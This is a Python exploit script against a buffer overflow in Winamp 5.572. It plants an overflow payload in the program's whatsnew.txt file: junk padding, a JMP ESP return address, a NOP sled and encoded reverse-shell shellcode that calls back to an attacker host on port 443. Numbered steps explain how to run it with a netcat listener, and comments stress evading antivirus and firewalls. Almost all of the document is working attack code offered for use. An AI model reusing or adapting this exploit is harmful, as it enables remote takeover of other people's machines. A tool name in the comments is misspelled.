#The following python script utilises a buffer overflow vulnerability in Winamp v5.5732 to a gain reverse shell, allowing the attacker to conduct Remote Code Execution (RCE) on the target machine
#The shellcode used contains a NOP sled of 100 bytes for redundancy
#It avoids the bytes \x00\x09\x0A\x0D\x1A\x20 as they represent "bad characters" in ASCII which may intefere with the execution of the shellcode
#Shikata Ga Nai encoding is used prevent detection from Anti-Virus software 
#The reverse shell utilises port 443, which is reserved for HTTPS traffic. This is a very common port used for secure web browsing and will almost certainly not be blocked by any firewalls
#The local port utilised in the code below is 192.168.100.2. Please replace this in the vsfvenom command with whatever the IP address of your machine is, which can found using ifconfig (Linux) or ipconfig (Windows)

#To run the exploit:
#1. Open Command Prompt (cmd)
#2. Navigate to the directory where "exploit.py" is located, using the cd command
#3. Run the command: "python exploit.py" - you should see a message that an exploit file has been created
#4. Open Winamp
#5. Using Kali, run the command "nc -v -l -p 443" in the terminal to listen on port 443 using netcat
#6. At the top of Winamp, in the drop menu, select help -> About Winamp... 
#7. Check the Kali machine to verify a reverse shell has been gained

with open('C:\Program Files\Winamp\whatsnew.txt', 'w') as f: #open text file called "whatsnew.txt" in "write" mode. This file displays information about the version of Winamp, and overwriting it can cause a buffer overflow to occur
	f.write('Winamp 5.572') #this needs to be the first chars of the file
	f.write('A'*540) #fill the rest of the buffer with junk bytes 
	f.write('\xD7\x30\x9D\x7C\x7C') #address of JMP ESP from SHELL32.dll, entered little endian with last char repeated for redundancy
	f.write('\x90'*100) #100 NOPs for redundancy in case memory moves around
	#the following shellcode was generated using the following Kali command: vsfvenom -n 100 -p windows/shell_reverse_tcp -f python -a x86 --platform windows -b "\x00\x09\x0A\x0D\x1A\x20" -e x86/shikata_ga_nai LHOST=192.168.100.2 LPORT=443
	buf =  ""
	buf += "\x99\x49\x92\x49\x49\x42\x9b\x90\x93\x37\x4a\x99\xf5"
	buf += "\xfc\xf8\x93\x27\x90\xfd\x4a\x41\x41\x91\xf8\x9f\x3f"
	buf += "\xf8\x43\x27\x98\x41\x9f\x48\x92\x9b\x27\xf8\x42\x48"
	buf += "\x43\x98\x92\xf8\xf5\xfc\x48\x41\x98\xf8\x27\x3f\x3f"
	buf += "\x43\xf9\x92\x9b\x93\xfc\x3f\x91\x4a\x49\xd6\x43\x92"
	buf += "\x27\x49\xf8\x9b\xf8\x93\x91\x93\x3f\x27\x99\x9f\x2f"
	buf += "\x4b\x91\x92\x40\x48\x3f\x98\x3f\x93\x43\x90\x9b\x43"
	buf += "\x90\xf8\x90\xd6\x41\x3f\x2f\x3f\x48\xdb\xcd\xd9\x74"
	buf += "\x24\xf4\x58\xbb\xcb\xab\xd2\xc8\x2b\xc9\xb1\x52\x31"
	buf += "\x58\x17\x83\xe8\xfc\x03\x93\xb8\x30\x3d\xdf\x57\x36"
	buf += "\xbe\x1f\xa8\x57\x36\xfa\x99\x57\x2c\x8f\x8a\x67\x26"
	buf += "\xdd\x26\x03\x6a\xf5\xbd\x61\xa3\xfa\x76\xcf\x95\x35"
	buf += "\x86\x7c\xe5\x54\x04\x7f\x3a\xb6\x35\xb0\x4f\xb7\x72"
	buf += "\xad\xa2\xe5\x2b\xb9\x11\x19\x5f\xf7\xa9\x92\x13\x19"
	buf += "\xaa\x47\xe3\x18\x9b\xd6\x7f\x43\x3b\xd9\xac\xff\x72"
	buf += "\xc1\xb1\x3a\xcc\x7a\x01\xb0\xcf\xaa\x5b\x39\x63\x93"
	buf += "\x53\xc8\x7d\xd4\x54\x33\x08\x2c\xa7\xce\x0b\xeb\xd5"
	buf += "\x14\x99\xef\x7e\xde\x39\xcb\x7f\x33\xdf\x98\x8c\xf8"
	buf += "\xab\xc6\x90\xff\x78\x7d\xac\x74\x7f\x51\x24\xce\xa4"
	buf += "\x75\x6c\x94\xc5\x2c\xc8\x7b\xf9\x2e\xb3\x24\x5f\x25"
	buf += "\x5e\x30\xd2\x64\x37\xf5\xdf\x96\xc7\x91\x68\xe5\xf5"
	buf += "\x3e\xc3\x61\xb6\xb7\xcd\x76\xb9\xed\xaa\xe8\x44\x0e"
	buf += "\xcb\x21\x83\x5a\x9b\x59\x22\xe3\x70\x99\xcb\x36\xd6"
	buf += "\xc9\x63\xe9\x97\xb9\xc3\x59\x70\xd3\xcb\x86\x60\xdc"
	buf += "\x01\xaf\x0b\x27\xc2\x10\x63\x43\x10\xf9\x76\x8b\x15"
	buf += "\x42\xff\x6d\x7f\xa4\x56\x26\xe8\x5d\xf3\xbc\x89\xa2"
	buf += "\x29\xb9\x8a\x29\xde\x3e\x44\xda\xab\x2c\x31\x2a\xe6"
	buf += "\x0e\x94\x35\xdc\x26\x7a\xa7\xbb\xb6\xf5\xd4\x13\xe1"
	buf += "\x52\x2a\x6a\x67\x4f\x15\xc4\x95\x92\xc3\x2f\x1d\x49"
	buf += "\x30\xb1\x9c\x1c\x0c\x95\x8e\xd8\x8d\x91\xfa\xb4\xdb"
	buf += "\x4f\x54\x73\xb2\x21\x0e\x2d\x69\xe8\xc6\xa8\x41\x2b"
	buf += "\x90\xb4\x8f\xdd\x7c\x04\x66\x98\x83\xa9\xee\x2c\xfc"
	buf += "\xd7\x8e\xd3\xd7\x53\xbe\x99\x75\xf5\x57\x44\xec\x47"
	buf += "\x3a\x77\xdb\x84\x43\xf4\xe9\x74\xb0\xe4\x98\x71\xfc"
	buf += "\xa2\x71\x08\x6d\x47\x75\xbf\x8e\x42"
	f.write(buf) #write the shellcode
print('Exploit file generated') #lets the user know the file is made, by printing to cmd

